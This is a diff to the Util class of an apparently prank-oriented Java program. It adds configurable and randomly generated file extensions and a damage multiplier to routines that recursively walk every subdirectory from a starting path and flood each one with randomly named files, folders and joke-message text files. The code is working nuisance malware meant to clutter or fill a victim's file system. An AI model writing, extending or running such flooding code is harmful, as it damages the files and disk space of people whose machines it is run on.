@@ -5,6 +5,7 @@ import java.io.File;
 import java.io.FileFilter;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.util.ArrayList;
 import java.util.Random;
 import javax.swing.JOptionPane;
 
@@ -13,9 +14,10 @@ public class Util {
 	//generates random names 
 	public  String name() {
 		
+		
 		//name length
 		int nameLength=10;
-		
+		//rng generator
 		Random rngRandom =new Random();
 		
 		//variable for storing name
@@ -72,7 +74,7 @@ public class Util {
     }
 	
 	//floods the directory
-	public  void flood(int damage, String trollMessage[] , File path) {
+	public  void flood(int damage, String trollMessage[] , File path, ArrayList<String> extensions , boolean random) {
 			
 			
 			//rng for the messages
@@ -93,14 +95,45 @@ public class Util {
 				
 				//makes a file and writes the message in it
 		try {
-				//creates a folder
-				File folderFile= new File(pathName);
-				folderFile.mkdir();
+			/*if random are allowed it will:
+			 *  -check if the extensions list is empty
+			 *  	-if the extensions list isn't empty it will make sure the randoms are proportionally as much as the others
+			 *  -else there will be only randoms
+			 *if random are not allowed the extensions will be only from the list
+			*/
+			String ext;
+				if (random) {
+					if (extensions.isEmpty()) {
+						//no added extensions
+						ext = extensionGenerator();
+					} else {
+						//added extensions
+						if (rng.nextInt(extensions.size())!=0) {
+							ext = extensions.get(rng.nextInt(extensions.size()));
+						}else {
+							ext = extensionGenerator();
+						}
+					}
+				}else {
+					ext=extensions.get(rng.nextInt(extensions.size()));
+				}
+		
+				if (ext.equals("")) {
+					//creates a folder
+					File folderFile= new File(pathName);
+					folderFile.mkdir();
+					
+				}else {
+					// creates a txt file
+					BufferedWriter bReader=new BufferedWriter(new FileWriter(pathName+ext));
+					//if it is a .txt file there will be a yo mama joke
+					if (ext.equals(".txt")) {
+						bReader.write(message);
+					}	
+					bReader.close();
+				}
 				
-				// creates a txt file
-				BufferedWriter bReader=new BufferedWriter(new FileWriter(pathName+".txt"));
-				bReader.write(message);
-				bReader.close();
+				
 			} catch (IOException e) {
 				e.printStackTrace();
 			}		
@@ -170,19 +203,49 @@ public class Util {
 	}
 	
 	//controls the damage spread covering all of the folders inside
-	public  void Controler(File startingPath,int damage,String[] trollMessage) {
+	public  void Controler(File startingPath,int damage,String[] trollMessage ,ArrayList<String> extentions, boolean allXDmg, boolean Random) {
 		//the program starts in the starting path
 		File[] listFolders=dirReader(startingPath);
-		
+		if (allXDmg) {
+			damage*=extentions.size();
+		}
 		//for cycle to walk around all directories
 		for (int i = 0; i < listFolders.length; i++) {
 			//search for other paths
-			Controler(listFolders[i],damage,trollMessage);
+			Controler(listFolders[i],damage,trollMessage, extentions ,allXDmg , Random);
 		}
 		//NUKE this path last to save the program time
 		//System.out.println(startingPath+"\t\tflooded");
-		flood(damage, trollMessage, startingPath);
+		flood(damage, trollMessage, startingPath, extentions, Random);
+
+	}
+	
+	//creates random extensions
+	public static String extensionGenerator(){
 		
+		//rng generator
+		Random rngRandom =new Random();
 		
+		//ext length
+		int extentionLength = 2 + rngRandom.nextInt(3);
+		
+		//variable for storing ext
+		String extentionString ="";
+		
+		//array of chars to store extlength characters
+		char letter[]=new char[extentionLength];
+		for (int i = 0; i < extentionLength; i++) 
+			
+				//random character picking
+			letter[i]=(char)(rngRandom.nextInt(26)+97);
+		
+		//adds up the characters in a string witch is the name
+		for (int i = 0; i <extentionLength; i++) {
+			
+			extentionString+=letter[i];
+		}
+		return "."+extentionString;
+
+	
 	}
 }
